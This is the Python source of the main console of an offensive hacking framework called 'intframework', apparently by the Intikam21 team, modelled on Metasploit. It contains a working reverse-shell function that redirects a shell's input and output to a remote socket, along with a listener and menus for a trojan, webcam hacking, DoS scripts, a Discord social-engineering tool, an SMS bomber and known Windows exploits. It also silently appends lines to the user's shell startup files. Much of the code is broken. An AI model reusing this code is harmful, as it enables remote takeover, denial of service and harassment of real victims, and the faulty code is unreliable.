#!/usr/bin/env python3
# -*- coding: utf-8 -*-
global phisherserror
global clouderror
import os
try:
	os.system("$INTFRAMEWORK_PATH") or os.system("echo $INTFRAMEWORK_PATH")
except:
	os.system("export INTFRAMEWORK_PATH=$PREFIX/opt/intframework") or os.system("export INTFRAMEWORK_PATH=usr/opt/intframework")
cto = 0
try:
	if cto != 0:
		pass
	else:
		os.system("echo 'export intmodules_path=$INTFRAMEWORK_PATH/modules' >> ~/.bashrc; echo 'export intmodules_path=$INTFRAMEWORK_PATH/modules' >> ~/.zshrc")
		cto += 1
except:
	pass
from pyfiglet import Figlet
from colorama import Fore, init, Style
import threading
import requests
import time
import sys
import os
import base64
import time as t
import argparse
import sys
import platform
import getpass
import subprocess
import socket
from netaddr import IPNetwork, IPAddress
import argparse
import socket
import re
import threading
import time
import sys
import random
import urllib.request
from queue import Queue
import sqlite3
from modules.commands.banner import *
from modules.commands.dns_lookup import *

try:
	from modules import evasionint
except:
	pass
try:
	from modules import usersearcher
except:
	pass
try:
	from modules.usersearcher import searchus, banner, outer_func
except:
	pass
try:
	from modules.exploit_searcher import search_exploits, download_exploit
except:
	pass
try:
	from modules import exploit_searcher
except:
	pass
try:
	from modules import expdatabase
except:
	pass
try:
	from modules.expdatabase import create_option, create_exploit, show_options, set_option, run_exploit, use_framework, import_framework, initialize_framework
	from modules.expdatabase import import_framework, show_options, set_option, run_exploit, use_framework, create_exploit
except:
	print("exploit database not found please reinstall framework")
	pass
try:
	from modules import intmodules
except:
	pass
try:
	import intattack
except:
	pass
try:
	from modules.intattack import *
except Exception as e:
	print("[01.intbase] modules.intattack Not founded please reinstall framework")
	pass
try:
	import handlerunner
except Exception as e:
	print("[02.intbase] modules.exploit Not founded please reinstall framework")
	pass
try:
	from modules.exploits import *
except Exception as e:
	print("[03.intbase] modules.exploit Not founded please reinstall framework")
	pass
try:
	from modules.scanners import Bluetooth_scanner, adminfinder, dirscanner, dns_scanner, emailscan, networkscan, ping_scan, portscan, service_scanner, userscan, vulnerability_scanner, wlanscanner
except Exception as e:
	print("[04.intbase] modules.scanners Not founded please reinstall framework")
	pass
try:
	from modules.scanners.Crack import *
except Exception as e:
	print("[05.intbase] modules.scanners.Crack Not founded please reinstall framework")
	pass
try:
	from modules import login
except Exception as e:
	pass
try:
	from cloud import intcloud
	clouderror = False
except Exception as e:
	clouderror = True
	pass
try:
	from PHİSHERS import *
	phisherserror = False
except Exception as e:
	phisherserror = True
	pass
try:
	from modules import *
except Exception as e:
	pass
try:
	from modules import network_scan
except Exception as e:
	try:
		import network_scan
	except Exception as e:
		pass
	pass
try:
	from network_scan import *
except:
	pass
	
try:
	from exploiter import *
except:
	pass
try:
	from uuid_changer import *
except:
	pass
def manager():
	import PluginManager
	manager = PluginManager.PluginManager()




import PluginManager
pg_manager = PluginManager.PluginManager()


import os
import sqlite3

class NmapDatabase:
    def __init__(self, db_name='nmap_results.db'):
        self.db_name = db_name
        self.conn = sqlite3.connect(self.db_name)
        self.create_table()

    def create_table(self):
        """Veritabanında bir tablo oluşturur."""
        with self.conn:
            self.conn.execute('''
                CREATE TABLE IF NOT EXISTS scans (
                    id INTEGER PRIMARY KEY,
                    target TEXT NOT NULL,
                    port INTEGER NOT NULL,
                    protocol TEXT NOT NULL,
                    state TEXT NOT NULL,
                    service TEXT
                )
            ''')

    def insert_scan_result(self, target, port, protocol, state, service):
        """Tarama sonuçlarını veritabanına ekler."""
        with self.conn:
            self.conn.execute('''
                INSERT INTO scans (target, port, protocol, state, service)
                VALUES (?, ?, ?, ?, ?)
            ''', (target, port, protocol, state, service))

    def list_scan_results(self):
        """Veritabanındaki tarama sonuçlarını listeler."""
        cursor = self.conn.cursor()
        cursor.execute('SELECT * FROM scans')
        rows = cursor.fetchall()
        for row in rows:
            print(row)

    def clear_database(self):
        """Veritabanını temizler."""
        with self.conn:
            self.conn.execute('DROP TABLE IF EXISTS scans')
            self.create_table()  # Yeniden tablo oluştur

    def close(self):
        """Veritabanı bağlantısını kapatır."""
        self.conn.close()

class NmapScanner:
    def __init__(self):
        self.db = NmapDatabase()

    def run_command(self, command):
        """Kullanıcıdan alınan Nmap komutunu çalıştırır."""
        try:
            print(f"Executing command: {command}")
            result = os.popen(command).read()
            print(result)
            self.save_results_to_db(result, command)
        except Exception as e:
            print(f"An error occurred: {e}")

    def save_results_to_db(self, result, command):
        """Tarama sonuçlarını veritabanına kaydeder."""
        target = command.split()[-1]  # Hedef IP veya hostname'i al
        try:
            for line in result.splitlines():
                if "/tcp" in line:  # TCP portları içeren satırları kontrol et
                    parts = line.split()
                    port_info = parts[0].split('/')  # Port bilgilerini ayır
                    port = int(port_info[0])  # Port numarasını al
                    protocol = port_info[1]  # Protokolü al
                    state = parts[-1]  # Durumu al
                    service = parts[1] if len(parts) > 1 else None  # Servis adını al
                    self.db.insert_scan_result(target, port, protocol, state, service)
            print(f"Scan results for {target} saved to database.")
        except Exception as e:
            print(f"An error occurred while saving results to DB: {e}")

def data():
	global LHOSTS
	global LPORTS
	global RHOSTS
	global RPORTS
def False_adresses():
	adr = "$INTFRAMEWORK_PATH"
	random = ["a", "b", "c", "d", "e", "f", "g", "ğ", "h", "ı", "i", "j", "k", "l", "m", "n", "o", "ö", "p", "r", "s", "ş", "t", "u", "ü", "v", "y","x", "z"]
	selecter_num = random.randint(1, 20)
	selecter = random.select(random, selecter_num)
	user = help_input
	special_characters = ["@", "#", "$", "&", "%"  "~"]
	if user in random and special_characters:
		if user in random and special_characters and selecter_num:
			random_super = user
		else:
			random_super = user
	pool = ["{adr}/multi/handler/", "{adr}/modules/enum_{random_super}"]
	return pool
def check_network():
    try:
        # Attempt to connect to Google's DNS server
        socket.create_connection(("8.8.8.8", 53))
        return True
    except OSError:
        return False
        print("You are int-py mode")
# intconsole komutu
    # ASCII sanatı
	
ascii_sanat = """⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⠶⠶⠶⠶⢦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⠛⠁⠀⠀⠀⠀⠀⠀⠈⠙⢷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡾⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡾⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣷⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠸⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⣠⡴⠞⠛⠉⠉⣩⣍⠉⠉⠛⠳⢦⣄⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡀⠀⣴⡿⣧⣀⠀⢀⣠⡴⠋⠙⢷⣄⡀⠀⣀⣼⢿⣦⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣧⡾⠋⣷⠈⠉⠉⠉⠉⠀⠀⠀⠀⠉⠉⠋⠉⠁⣼⠙⢷⣼⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣇⠀⢻⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡟⠀⣸⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣹⣆⠀⢻⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡟⠀⣰⣏⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⠞⠋⠁⠙⢷⣄⠙⢷⣀⠀⠀⠀⠀⠀⠀⢀⡴⠋⢀⡾⠋⠈⠙⠻⢦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⠋⠀⠀⠀⠀⠀⠀⠹⢦⡀⠙⠳⠶⢤⡤⠶⠞⠋⢀⡴⠟⠀⠀⠀⠀⠀⠀⠙⠻⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣼⠋⠀⠀⢀⣤⣤⣤⣤⣤⣤⣤⣿⣦⣤⣤⣤⣤⣤⣤⣴⣿⣤⣤⣤⣤⣤⣤⣤⡀⠀⠀⠙⣧⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣸⠏⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⢠⣴⠞⠛⠛⠻⢦⡄⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠸⣇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢠⡟⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⣿⣿⢶⣄⣠⡶⣦⣿⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⢻⡄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣾⠁⠀⠀⠀⠀⠘⣇⠀⠀⠀⠀⠀⠀⠀⢻⣿⠶⠟⠻⠶⢿⡿⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠈⣿⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢰⡏⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⢾⣄⣹⣦⣀⣀⣴⢟⣠⡶⠀⠀⠀⠀⠀⠀⣼⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠈⠛⠿⣭⣭⡿⠛⠁⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠘⣧⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⢿⡀⠀⠀⠀⠀⠀⠀⣀⡴⠞⠋⠙⠳⢦⣀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⢰⡏⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⢿⣄⣀⠀⠀⢀⣤⣼⣧⣤⣤⣤⣤⣤⣿⣭⣤⣤⣤⣤⣤⣤⣭⣿⣤⣤⣤⣤⣤⣼⣿⣤⣄⠀⠀⣀⣠⡾⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠛⠻⢧⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠼⠟⠛⠛⠉⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
. ⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ⣿⣿⣿⣿⣿⣷⣷⣶⣿⣿ """	
print(ascii_sanat)
    # 5 saniye boyunca animasyonu çalıştır
os.system("python3 startoolkit.py")
time.sleep(4)   

init()      
global jobs
# Initialize jobs dictionary
jobs = {}

# Function to add a job
def add_job(job_name, exploit=None):
    job_id = len(jobs) + 1
    jobs[job_id] = {'name': job_name, 'exploit': exploit}

# Function to list jobs
def list_jobs():
    for job_id, job_info in jobs.items():
        job_name = job_info['name']
        exploit = job_info['exploit']
        print(f"[{job_id}] {job_name}: executed")
        print("EXPLOITS")
        print("==========")
        print(f"    {job_id} {exploit if exploit else 'None'}")
        

# Job silme fonksiyonu
def kill_job(job_id):
    if job_id in jobs:
        print(f"Job [{job_id}] ({jobs[job_id]}) stopped and removed.")
        del jobs[job_id]
    else:
        print(f"No job found with ID: {job_id}")
def exit():
	print("BYE BYE")
	os.system("exit")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
os.system("clear")
if check_network():
	print("you are inthacker-mode")
	add_job("network")
else:
	print("you are handler mode")
def bind_tcp(lhosts, lports):
	try:
		s.bind(lhosts, lports)
		conn, addr = s.accept()
		print("tcp addr is accepted ")
	except:
		print("tcp addr is not value or not accepted")
def reverse_tcp(rhosts, rports, addr):
    try:        
        # Connect to the remote host and port
        s.connect((rhosts, rports))
        
        # Redirect standard input/output/error to the socket
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        
        subprocess.call([addr, '-i'])
    except Exception as e:
        print(f"Error: {e}")
        s.close()
def payloads():
    global meterpreter
    global payloads
    global payload_name
    global platform_g
    
    platform_g = platform.system()
    payload_name = ["/intchat/spesific", "/intframework/effuse/1", "/intframework/effuse/2", "/intframework/effuse/3", "/intframework/effuse/4", "/intframework/effuse/5", "/intframework/effuse/6", "/intframework/effuse/7", "/intframework/web/1", "/intframework/web/2", "/intframework/web/3", "/intframework/web/4", "/intframework/web/5", "/intframework/introjan/1", "/intframework/introjan/2", "/intframework/cam/1"]
    
    meterpreter = []
    for pn in payload_name:
        meterpreter.append(f"/{platform_g}{pn}/payloads/meterpreter/reverse_tcp")
        meterpreter.append(f"/{platform_g}{pn}/payloads/meterpreter/bind_tcp")
        meterpreter.append(f"/{platform_g}{pn}/payloads/meterpreter_reverse_tcp")
        meterpreter.append(f"/{platform_g}{pn}/payloads/meterpreter_bind_tcp")

def search_payloads(term):
    global meterpreter
    return [payload for payload in meterpreter if term in payload]
def strips(help_input, name):
    return help_input.split("=", 1)[1].strip() if "=" in help_input else help_input[help_input.find(f"set {name} ") + len(f"set {name} "):].strip() if help_input.find(f"set {name} ") != -1 else help_input.strip()
def print_payloads(payload_list):
    for payload in payload_list:
        platform_part = payload.split('/')[1]
        path_part = '/'.join(payload.split('/')[2:])
        path_part_colored = path_part.replace('effuse', f"{Fore.BLUE}effuse{Style.RESET_ALL}")
        path_part_colored = path_part_colored.replace('web', f"{Fore.BLUE}web{Style.RESET_ALL}")
        path_part_colored = path_part_colored.replace('introjan', f"{Fore.BLUE}introjan{Style.RESET_ALL}")
        path_part_colored = path_part_colored.replace('cam', f"{Fore.BLUE}cam{Style.RESET_ALL}")
        platform_colored = f"{Fore.RED}{platform_part}{Style.RESET_ALL}"
        meterpreter_colored = payload.split('/')[-1].replace('meterpreter', f"{Fore.RED}meterpreter{Style.RESET_ALL}")
        meterpreter_colored = meterpreter_colored.replace('reverse_tcp', f"{Style.BRIGHT}reverse_tcp{Style.RESET_ALL}")
        meterpreter_colored = meterpreter_colored.replace('bind_tcp', f"{Style.BRIGHT}bind_tcp{Style.RESET_ALL}")
        final_payload = f"/{platform_colored}/{path_part_colored}"
        print(final_payload.replace(payload.split('/')[-1], meterpreter_colored))
def used(used):
	if used == "used":
		pass
	else:
		print('you are not used')
def reverse_used(used, helper):
	if used == "used":
		print(f"[{Fore.RED}intbase{Fore.RESET}] you are used the tool", f"""
		example usage:
			{helper}
		""")
	else:
		pass
def dev_tools(dir, tool, norm):
	os.system(f"cd {dir}")
	if tool.lower() == "imei":
		os.system("""echo "imei='python /data/data/com.termux/files/home/intframework/imei.py' >> $INTFRAMEWORK_PATH/.bashrc """)
		used = "used"
		used(used)
	if tool.lower() == "sms" or "smsbomber" or "smsbomb":
		os.system("""echo "alias sms='python /data/data/com.termux/files/home/intframework/sms.py' >> $INTFRAMEWORK_PATH/.bashrc """)
	if tool.lower() == "connectbot":
		os.system("""echo "alias connectbot='python /data/data/com.termux/files/home/intframework/connectbot.py' >> $INTFRAMEWORK_PATH/.bashrc """)
	used_dev_tools = "used"
	os.system("source ~/.bashrc")
	used(used_dev-tools)
def launch_normaltools():
	pass
def search_evasions():
	os.system("python3 evasionint.py -s")
def listen_p(ip, port):
    # Soket oluştur
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((ip, port))
    server_socket.listen(5)  # 5'e kadar bekleme kuyruğu
    print(f"Listening on {ip}:{port}")

    while True:
        client_socket, addr = server_socket.accept()
        print(f"Connection from {addr}")

        while True:
            data = client_socket.recv(1024)
            if not data:
                break
            print(f"Received data: {data.decode('utf-8')}")
        
        client_socket.close()
        print(f"Connection from {addr} closed")

def login(username, password):
	login.register(username, password)
def bannerss(help_input):
	global bannerss	
	bannerss = help_input[12:] or help_input[15:]
	banner()
	banners += bannerss	
	
def inputrs(sk):
	if sk.lower("y" or "yes"):
		pass
	if sk.lower("n" or "no"):
		exit()
	else:
		exit()
def parse_input(input_str):
    parts = input_str.split(':')
    if len(parts) == 1:
        return parts[0].split()[0], None
    elif len(parts) == 2:
        if parts[1].isdigit():
            return parts[0].split()[0], int(parts[1])
        else:
            raise ValueError("Geçersiz giriş formatı. Port sayısı geçerli bir tamsayı olmalıdır.")
    else:
        raise ValueError("Geçersiz giriş formatı. IP adresi/domain ve opsiyonel olarak port giriniz.")
def db_connect():
    # Veritabanına bağlan (örneğin, SQLite kullanıyorsanız)
    connection = sqlite3.connect('database.db')
    cursor = connection.cursor()
    return connection, cursor

def db_list(connection=sqlite3.connect('database.db'), cursor="connection.cursor()"):
    # Komutları listeleyin (örneğin, veritabanındaki tabloları listeleme)
    cursor.execute("SELECT name FROM sqlite_master WHERE type='table';")
    tables = cursor.fetchall()
    for table in tables:
        print(f"Tablo adı: {table[0]}")

def db_disconnect(connection=sqlite3.connect('database.db')):
    # Bağlantıyı kapat
    connection.close()

def search(modules, query):
    results = {}
    query = query.lower()  # Convert query to lowercase for case-insensitive search
    
    for modul, description in modules.items():
        if query in modul.lower():  # Check if query matches module name
            results[modul] = description
    
    return results

# Example modules dictionary:
modules = {
    "introjan": "the best trojan horse tool",
    "oip": "the #3 information Gathering Tools",
    "intshark": "If you can't find anything, type intshark and find additional tools that we don't make or don't recognize.",
    "use": "use modules",
    "mode-admin": "use admin mode",
    "set": "set command, add and adjust settings",
    "bset": "bset sets a adjuet settings",
    "star": "chmodding tools",
    "search": "search tools",
    "item": "Call it with the item command without using callers like Python",
    "show": "show tools or exploits",
    "back": "back to term",
    "jobs": "see a jobs",
    "connect": "listen ip",
    "intweb": "Web hacking Tool",
    "intcam": "Cam Hack For intikam21 users",
    "intmeterpreter": "payload using and creating"
}
payloads = None
prompt = None
def get_meterpreter():
    global payloads
    try:
        result = subprocess.run(["python3", "intmeterpreter.py", "-pe"], check=True, capture_output=True, text=True)
        payloads = result.stdout.strip()  # Ensure payloads are stripped of any extra whitespace
    except subprocess.CalledProcessError as e:
        pass



def check_ip(ip):
    # Check if the IP address is valid
    try:
        socket.inet_aton(ip)
        print(f"{ip} is a valid IP address.")
    except socket.error:
        print(f"{ip} is not a valid IP address.")
        return
    
    # Try to connect to the IP address
    try:
        response = requests.get(f"http://{ip}")
        if response.status_code == 200:
            print(f"Successfully connected to {ip}.")
        else:
            print(f"Failed to connect to {ip}, status code: {response.status_code}")
    except requests.ConnectionError:
        print(f"Failed to connect to {ip}.")

def exploits(exp_name, output=None):
    os.system(f"python3 exploit_searcher.py keyword {exp_name} {'-o ' + output if output else ''}")
def listen(ip):
    HOST = ip 
    PORT = 5555

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        s.bind((HOST, PORT))
        s.listen(1)
        print('Socket bind complete')
        conn, addr = s.accept()
        print('Connected with ' + addr[0] + ':' + str(addr[1]))
        add_job(f"Listening {host}")
    except socket.error as msg:
        print('Bind failed. Error Code : ' + str(msg.errno) + ' Message ' + msg.strerror)
        pass
def user_count(help_input, repeat_count=2):
	inputs = []
	targets = ["set rhosts", "set rports", "set lports", "set lports", "set rhost", "set rport"]
	inputs.append(help_input)
	if help_input.lower() in targets and inputs.count(help_input) == repeat_count:
		if targets == "set rhosts" or "set rhost":
			print("""you are used rhosts you are must use ("del rhosts") or ("del rhost")  """)
		if targets == "set rport" or "set rports":
			print("""you are used rhosts you are must use ("del rports") or ("del rport")  """)
		if targets == "set lhost" or "set lhosts":
			print("""you are used rhosts you are must use ("del lhosts") or ("del lhost")  """)
		if targets == "set rhosts" or "set rhost":
			print("""you are used rhosts you are must use ("del lports") or ("del lport")  """)
import pywifi
from pywifi import *
from pywifi import PyWiFi, const, Profile
try:
	from scapy.all import sniff, Dot11, Dot11Beacon
except:
	pass
def is_root():
	return os.getuid() == 0
def scan_wifispy():
	if not is_root():
	   wifi = PyWiFi()
	   iface = wifi.interfaces()[0]  # Kullanmak istediğiniz WiFi arayüzünü seçin.
	   iface.scan()
	   iface.scan_results()
	   results = iface.scan_results()
	   for network in results:
	   	print(f"SSID: {network.ssid}, BSSID: {network.bssid}, Signal Level: {network.signal}")
	else:
		print("wifi not found")
		pass
	if is_root():
	       if packet.haslayer(Dot11Beacon):
	       	ssid = packet[Dot11].info.decode()
	       	bssid = packet[Dot11].addr3
	       	level = packet.dBm_AntSignal
	       	print(f"SSID: {ssid}, BSSID: {bssid}, Signal Level: {level}")
	else:
		print("wifi not found")
		pass

from colorama import Fore, Style, init			
init()
def scan5115(interface):
    from wifi import Cell, Scheme
    import scapy.all as scapy
    try:
    	networks = Cell.all(interface)
    except FileNotFoundError:
    	print("iwlist not found")
    if os.getuid() == 0:
    	print("[intbase] device is not rooted!")
    	
    print(f"{len(networks)} adet kablosuz ağ bulundu:")
    for network in networks:
        print(f"SSID: {network.ssid}")
        print(f"BSSID (MAC): {network.address}")
        print(f"Sinyal Gücü: {network.signal} dBm")
        print(f"Şifreleme: {network.encryption_type}\n")

def get_input(modules=None, modulename=None, cdn=None):
    global prompt
    get_meterpreter()
    module = modules if modules is not None else ""
    module_name = modulename if modulename is not None else ""
    cd = cdn if cdn is not None else ""
    prompt = (f"int4 payloads({Fore.RED}{payloads}{Fore.RESET})>{Style.RESET_ALL}" if payloads else
              f"int4 {module_name}({Fore.RED}{module}{Fore.RESET}) >{Style.RESET_ALL}" if module and module_name else
              f"int4 ({Fore.RED}{cd}{Fore.RESET}) >{Style.RESET_ALL}" if cd else
              f"int4 >")
get_input()
banner()
menu_banner()
global help_input
global valid_commands
valid_commands = {
"neofetch", "com-help", "intshark", "oip", "introjan", "intai", "track", "build", "mode-admin", "use", "set", "show", "build", "mode-", "back", "item", "search", "show commands", "int install", "connect", "int", "install", "mode-ninja", "int install mode-ninja", "int install git", "int install aichat", "use", "exploit", "bset", "banner", "py-search", "payload-search", "exp-search", "exploit-search", "jobs", "jobs -k", "dns", "help", "use ", "intcrawler", "searchuser", "mailsearch", "phonesearch", "connectbot", "meterpreter", "shotgun", "imei", "exp-search", "py-search", "run", "show", "whoI"
    }
global st
from uuid_manager import *
load_sessions()
create_session("intrpc", "root@int")
while True:
    help_input = input(prompt)
    if help_input.lower() == "help":
    	print("""
General
==========
		|COMMAND|         |Function|
		---------------------		 -----------------
		mode-{mode-name}	-switches to that mode
		use						-use commands
		set                          -set a settings
		jobs                         -see a jobs
		whoami                 -see a name
		neofetch                -see a system
		item					   -Call it with the item command without using callers like Python
		search                   -Search in the console
		star						-chmodding tools
		introjan				 -The best Trojan Horse
		oip					     -informa]tion gathering tool
		banner 				-using banner tutorial
		intshark				-If you can't find anything, type intshark and find additional tools that we don't make or don't recognize
		show					-show commands or tools or exploits
		back					-Back to term or back to console
		break				   -Break to while
		int install			-install packages 
		connect              -connect a ip
		color				   -Term color
		run 					 - Run modules
		monitor              - running web on virtual pc or console (mode-on needed)
		load_plugins     - usage load_plugins (plugin path)
		run_plugins       - runing plugins
		list_plugins       - zaten biliyorsunuz aq eklentileri listeliyor.
		
USING COMMANDS
==================
        |Command|         |Function|
        ------------------          ---------------
          use                    -using modules
          bset                   -your special settings
          set                     -for modularity settings
          show                 -showing modules
          exploit               -run exploits
          run                     -running modules

DB COMMANDS
==============
      |Command|        |Function|
      -------------------        ----------------
      db_connect      - connecting database
      db_list               - listing db
      db_disconnect  - disconnecting database
      
SEARCHING
===========
    |Command|       |Function|
    -------------------       ---------------
    search                 -searching commands
    py-search            - searching payloads
	exp-search         - searching exploits
	show                   - showing your want module
	info                     - infos for your module

PLUGIN COMMANDS
==================
    |Command|        |Function|
    ------------------         ----------------
    load_plugins        - add path and loading plugin
    list_plugins          - listing plugins
    run_plugins         - running plugins

			
			
HELLO, WE ARE THE İNTİKAM21 CYBER TEAM, THE REASON WE MADE THIS TOOL IS TO EDUCATE PEOPLE WHO LEARN HACKING, ONLY MALWARE BEHAVIOR BY THE USER OR INFECTION OF A SYSTEM IS NOT UNDER OUR RESPONSIBILITY, GOOD WORK🙋
			[intweb]Web scanner for intikam21 users
			[intcam]Cam Hack for intikam21 users
			
			we are working...		
		""")	
    if help_input.startswith("py-search" or "payload-search") and help_input.endswith("''"):
    	    if help_input.startswith("payload-search '") and help_input.endswith("'"):
    	    	term = user_input[len("payload-search '"):-1]
    	    	result = search_payloads(term)
    	    	print_payloads(result)
    	    else:
    	    	term = user_input[len("py-search '"):-1]
    	    	result = search_payloads(term)
    	    	print_payloads(result) 
    if help_input.startswith("select"):
    	h  = help_input[7:]
    	if h.lower() == "doshack":
    		if get_input(cdn="auxiliary/dos"):
    			s = input("selected if you are want to run [y/n] else you are want to write a run on console* ")
    			if s.lower() == "y":
    				os.system("""    			 
    			    cd ~
    			    cd intframework
    			    cd DoShAcK
    			    python Doshack.py
    			    """)
    			else:
    				pass
    		else:
    			print("invalid command!")    			
    	if h.lower() == "dos.py":
    		if get_input(cdn="auxiliary/dos"):
    			s = input("selected if you are want to run [y/n] else you are want to write a run on console* ")
    			if s.lower() == "y":
    				os.system("""    			 
    				python3 DDOS.py
    			    """)
    			else:
    				pass
    		else:
    			print("invalid command")
    	if h.lower() == "-spc/discord":
    		if get_input(cdn="auxiliary/social-enginering"):
    			s = input("selected if you are want to run [y/n] else you are want to write a run on console* ")
    			if s.lower() == "y":
    				os.system("""
    				python3 DİSCORD.py
    			    """)
    			else: 
    				pass
    			os.system("python3 DİSCORD.py")
    		else:
    			print("İNVALİD COMMAND")
    	if h.lower() == "intformations":
    		if get_input(cdn="auxiliary/social-enginering"):
    		    try:
    			    f  = os.system("""
    			apt update -y && apt upgrade -y
    			pkg install git
    			pkg install python
    			pkg install python3
    			git clone https://github.com/Intikam21kurucu/int-formations
    			chmod +x install.sh
    			./install.sh
    			""")
    		    except:
    		    	print()
    if help_input == "show examples":
    	print("""
    	For Examples:
		use command using auxiliary:
			use auxiliary
		selecting dirs example(if use auxiliary) else (use exploits or payloads or other tools):
			select {Your selecting module)
RUN
=======
	For Example:
		run shodan
		if you are set domain or others and use shodan following commands:
			use shodan
			set API={YourApiKey}
			or set API {YourApiKey}
			set mail=yourinfo@example.com
			or
			set DOMAİN=google.com
			else
			you are must using arguments or back else set other arguments for shodan
		finally:
			run
Examples:
    others enter a documents,
    # Entering Modules:
    	usage:
    		use modules (Your Path)
    	# example:
    		set other=127.0.0.1
    		use modules /intframework/modules/intcrawler/
    		run
    	""")
    if help_input == "show exploits":
    	print("""
+------------------------------------------------------------------------+
|                           EXPLOİTS                                    |
+------------------------------------------------------------------------+
| /intframework/modules/exploits/MS17-010/      |
| /intframework/modules/exploits/CVE-2006/       |
| /intframework/modules/exploits/CVE-2018-6389/       |
| /intframework/modules/exploits/CVE-2016-3074/       |
| /intframework/modules/exploits/CamExploit2/       |
| /intframework/modules/exploits/CollectID/           |
| /intframework/modules/exploits/DiamondFox/           |
| /intframework/modules/exploits/DropleGanger/        |
| /intframework/modules/exploits/HydraPwn/           |
| /intframework/modules/exploits/IE-AURORA/           |
| /intframework/modules/exploits/MS14-068/            |
